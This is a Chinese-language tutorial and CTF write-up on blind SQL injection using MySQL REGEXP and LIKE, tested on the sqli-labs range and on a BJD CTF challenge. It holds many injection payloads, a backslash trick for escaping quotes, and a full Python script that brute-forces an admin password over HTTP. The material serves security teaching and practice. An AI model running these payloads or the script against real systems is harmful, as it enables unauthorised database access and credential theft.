## 0x01 REGEXP注入分析

**注入原理** REGEXP注入，即regexp正则表达式注入。REGEXP注入，又叫盲注值正则表达式攻击。应用场景就是盲注，原理是直接查询自己需要的数据，然后通过正则表达式进行匹配。

### 1、基本注入

```
1.  `select (select语句) regexp '正则'`
    
```

正常的查询语句：

```
1.  `select username from users where id=1;`
    
```

（1）正则注入，若匹配则返回1，不匹配返回0

```
1.  `select (select username from users where id=1) regexp '^a';`
    
```

![](../Images/5321a869e241d04796de04607dde75fa.png) `^`表示pattern(模式串)的开头。即若匹配到username字段下id=1的数据开头为a，则返回1；否则返回0 （2）regexp关键字还可以代替where条件里的=号

```
1.  `select * from users where password regexp '^ad';`
    
```

![](../Images/614ceac11677c9c691cbcb07bba5cd5a.png) 使用场景：

> 过滤了=、in、like

`^`若被过滤，可使用 `$`来从后往前进行匹配

常用regexp正则语句：

```
1.  `regexp '^[a-z]'  #判断一个表的第一个字符串是否在a-z中`
    
2.  `regexp '^r'      #判断第一个字符串是否为r`
    
3.  `regexp '^r[a-z]' #判断一个表的第二个字符串是否在a-z中`
    
```

（3）在联合查询中的使用

```
1.  `1 union select 1,database() regexp '^s',3--+`
    
```

![](../Images/365af0ce0e81ba6fcbbd147975b43ef0.png)

## 0x02 LIKE注入分析

**like匹配** 百分比(%)通配符允许匹配任何字符串的零个或多个字符。下划线 `_`通配符允许匹配任何单个字符。

### 1、基本注入

**1. `like's%'`判断第一个字符是否为s**

```
1.  `1 union select 1,database() like 's%',3 --+`
    
```

**2. `like'se%'`判断前面两个字符串是否为se**

```
1.  `1 union select 1,database() like 'se%',3 --+`
    
```

**3. `like'%sq%'` 判断是否包含se两个字符串**

```
1.  `1 union select 1,database() like '%se%',3 --+`
    
```

4. `like'_____'`判断是否为5个字符

```
1.  `1 union select 1,database() like '_____',3 --+`
    
```

5. `like's____'` 判断第一个字符是否为s

```
1.  `1 union select 1,database() like 's____',3 --+`
    
```

### 2、LIKE盲注

依旧在sqli-labs靶场Less-8关进行测试 **1.判断数据库长度** 可用length()函数，也可用 `_`，如：

```
1.  `' or database() like '________'--+`
    
```

**2.判断数据库名**

```
1.  `' or database() like 's%'--+`
    
2.  `也可用`
    
3.  `' or database() like 's_______'--+`
    
```

## 0x03 REGEXP注入实战

学完REGEXP注入和LIKE注入后，是时候把BJD的 `简单注入`那道题复现一下了。BJD CTF的 `简单注入`主要涉及的是REGEXP盲注。开始复现：先fuzz一波，发现：

> 单引号 双引号都被ban了 union和select都被ban了 =和like被ban了

似乎没得思路了，看下wp，发现 `SQL语句逃逸单引号`,于是了解一下这个方法。 **SQL语句逃逸单引号** 主要是通过反斜线 `\`，将单引号转义，从而实现了SQL语句逃逸，造成SQL注入。意思就是：假设sql语句为：

```
1.  `select username,password from users where username='$user' and password='$pwd'`
    
```

假设输入的用户名是 `admin\`，密码输入的是 `or1#`整个SQL语句变成了

```
1.  `select username,password from users where username='admin\' and password=' or 1#'`
    
```

由于单引号被转义， `andpassword=`这部分都成了username的一部分，即

```
1.  `username='admin\' and password='`
    
```

这样 `or1`就逃逸出来了，由此可控，可作为注入点。

而fuzz结果，确实发现反斜线没有被ban掉。于是就可以注入了 ![](../Images/561697cb3eecc949ae39d4bce7494190.png) 然后发现这个地方会有变化。大师傅的wp上说用这个注不出登录密码，可以用REGEXP进行注入，并且还说要加上 `binary`关键字区分大小写。好了，先不看大师傅的脚本，自己把上边的脚本改一下，试试。试过后发现跑不出来。。。。看下wp，发现要转换16进制(16进制在数据库执行查询时又默认转换成字符串)，好吧。再改写下，最终成品如下：

```
1.  `import requests`
    
2.  `import string`
    
3.  
    
4.  `def str2hex(string):`
    
5.  `  result = ''`
    
6.  `  for i in string:`
    
7.  `    result += hex(ord(i))`
    
8.  `  result = result.replace('0x','')`
    
9.  `  return '0x'+result`
    
10.  
     
11.  `strs = string.ascii_letters+string.digits`
     
12.  `url = "http://3fb55301-c0be-4134-830b-fda52f321221.node3.buuoj.cn/"`
     
13.  `headers = {`
     
14.  `    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'`
     
15.  `}`
     
16.  `payload = 'or password regexp binary {}#'`
     
17.  `if __name__ == "__main__":`
     
18.  `    name = ''`
     
19.  `    for i in range(1,40):`
     
20.  `        for j in strs:`
     
21.  `            passwd = str2hex('^'+name+j)`
     
22.  `            payloads = payload.format(passwd)`
     
23.  `            postdata={`
     
24.  `                'username':'admin\\',`
     
25.  `                'password':payloads`
     
26.  `            }`
     
27.  `            r = requests.post(url,data=postdata,headers=headers)`
     
28.  `            if "BJD need" in r.text:`
     
29.  `                name += j`
     
30.  `                print(j,end='')`
     
31.  `                break`
     
```

跑出了用户密码 ![](../Images/ee6e7e73d8596f6611a08b7322ec3f75.png) 登录即可得到flag。。。复现完毕。
